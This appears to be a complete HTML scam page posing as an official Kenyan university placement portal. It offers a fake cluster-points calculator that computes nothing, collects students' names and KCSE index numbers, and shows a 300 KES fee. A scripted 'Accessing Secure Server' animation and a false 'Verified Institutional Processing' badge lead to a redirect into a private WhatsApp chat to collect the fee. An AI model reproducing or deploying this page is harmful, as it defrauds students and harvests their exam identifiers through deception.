<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PORTAL 2026 | Institutional Placement Protocol</title>
    <style>
        :root {
            --primary-navy: #0f172a;
            --accent-emerald: #059669;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
            --text-muted: #64748b;
        }

        * { box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; margin: 0; padding: 0; }
        body { background-color: var(--bg-light); color: var(--text-dark); padding-bottom: 50px; }

        header {
            background: #fff;
            padding: 25px;
            text-align: center;
            border-bottom: 1px solid #e2e8f0;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
        }

        .logo { font-weight: 900; letter-spacing: 3px; font-size: 1.4rem; color: var(--primary-navy); }
        .sub-tag { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 2px; display: block; margin-top: 5px; }

        .container { max-width: 480px; margin: 20px auto; padding: 0 15px; }

        .card {
            background: #fff;
            border-radius: 20px;
            padding: 28px;
            margin-bottom: 20px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
            border: 1px solid #f1f5f9;
        }

        h2 { font-size: 1.4rem; font-weight: 800; margin-bottom: 15px; color: var(--primary-navy); display: inline-block; }
        
        .price-badge {
            float: right;
            background: #fef3c7;
            color: #92400e;
            padding: 6px 14px;
            border-radius: 99px;
            font-size: 0.85rem;
            font-weight: 800;
        }

        label { display: block; font-size: 0.7rem; font-weight: 800; color: var(--text-muted); text-transform: uppercase; margin-bottom: 8px; margin-top: 15px; }

        input, select {
            width: 100%;
            padding: 14px;
            border: 1px solid #cbd5e1;
            border-radius: 10px;
            font-size: 1rem;
            background: #fdfdfd;
        }

        input:focus, select:focus { outline: none; border-color: var(--primary-navy); box-shadow: 0 0 0 3px rgba(15, 23, 42, 0.1); }

        .btn {
            width: 100%;
            padding: 16px;
            color: white;
            border: none;
            border-radius: 12px;
            font-weight: 800;
            font-size: 1rem;
            text-transform: uppercase;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.1s;
        }
        
        .btn:active { transform: scale(0.98); }

        .btn-calc { background: var(--primary-navy); }
        .btn-submit { background: var(--accent-emerald); box-shadow: 0 10px 15px -3px rgba(5, 150, 105, 0.4); }

        .price-table { width: 100%; margin: 20px 0; border-top: 1px solid #e2e8f0; padding-top: 15px; }
        .price-row { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 8px; }
        .total-row { display: flex; justify-content: space-between; font-weight: 900; font-size: 1.1rem; color: var(--primary-navy); margin-top: 10px; border-top: 2px solid #e2e8f0; padding-top: 10px; }

        .trust-footer { text-align: center; font-size: 0.65rem; color: var(--text-muted); margin-top: 15px; }

        /* Processing Overlay */
        #overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(15, 23, 42, 0.98);
            z-index: 1000;
            color: white;
            text-align: center;
            padding: 40vh 20px 0;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid var(--accent-emerald);
            border-radius: 50%;
            width: 50px; height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <header>
        <div class="logo">PORTAL • 2026</div>
        <span class="sub-tag">Institutional Placement Protocol</span>
    </header>

    <div id="overlay">
        <div class="spinner"></div>
        <h3 id="process-text">Accessing Secure Server...</h3>
    </div>

    <div class="container">
        <div class="card">
            <label>Subject 4 Grade</label>
            <select id="gradeSelect">
                <option value="12">A (12)</option>
                <option value="11">A- (11)</option>
                <option value="10">B+ (10)</option>
                <option value="7">C+ (7)</option>
            </select>

            <label>KCSE Aggregate Points (Max 84)</label>
            <input type="number" id="aggPoints" placeholder="e.g. 65">

            <button class="btn btn-calc" onclick="calculateCluster()">Calculate Cluster</button>
        </div>

        <div class="card">
            <span class="price-badge">300 KES</span>
            <h2>Registration</h2>
            
            <form id="placementForm">
                <label>Full Name</label>
                <input type="text" id="userName" placeholder="As per KCSE Slip" required>

                <label>KCSE Index Number</label>
                <input type="text" id="kcseIndex" placeholder="11-digit number" required>

                <label>Target Course</label>
                <input type="text" id="targetCourse" placeholder="e.g. Nursing" required>

                <div class="price-table">
                    <div class="price-row"><span>Institutional Service Fee</span><span>100 KES</span></div>
                    <div class="price-row"><span>Application Processing Fee</span><span>200 KES</span></div>
                    <div class="total-row"><span>TOTAL AMOUNT</span><span>300 KES</span></div>
                </div>

                <button type="button" class="btn btn-submit" onclick="initializeProtocol()">Initialize Placement Protocol</button>
            </form>
            <p class="trust-footer">🔒 Encrypted Session | Verified Institutional Processing</p>
        </div>
    </div>

    <script>
        function calculateCluster() {
            const points = document.getElementById('aggPoints').value;
            if(!points) {
                alert("Please enter your aggregate points to run the calculation.");
                return;
            }
            alert("Algorithm initialized. Proceed to registration to secure your calculated analysis.");
        }

        function initializeProtocol() {
            // 1. Capture exact IDs
            const name = document.getElementById('userName').value.trim();
            const index = document.getElementById('kcseIndex').value.trim();
            const course = document.getElementById('targetCourse').value.trim();

            if(!name || !index || !course) {
                alert("Please complete all fields to initialize the protocol.");
                return;
            }

            // 2. Black Box Animation
            const overlay = document.getElementById('overlay');
            const text = document.getElementById('process-text');
            overlay.style.display = 'block';

            setTimeout(() => { text.innerText = "Synchronizing Records..."; }, 1000);
            setTimeout(() => { text.innerText = "Running Probability Algorithm..."; }, 2500);
            
            // 3. Perfect WhatsApp Formatting
            setTimeout(() => {
                // Using %0A to force strict line breaks on all devices
                const whatsappMsg = `*OFFICIAL PLACEMENT REQUEST:*%0A%0A*Name:* ${name}%0A*KCSE Index:* ${index}%0A*Target Course:* ${course}%0A%0AI have initialized the protocol and am ready to process the 300 KES fee.`;
                
                window.location.href = `https://wa.me/254742050267?text=${whatsappMsg}`;
            }, 4000);
        }
    </script>
</body>
</html>
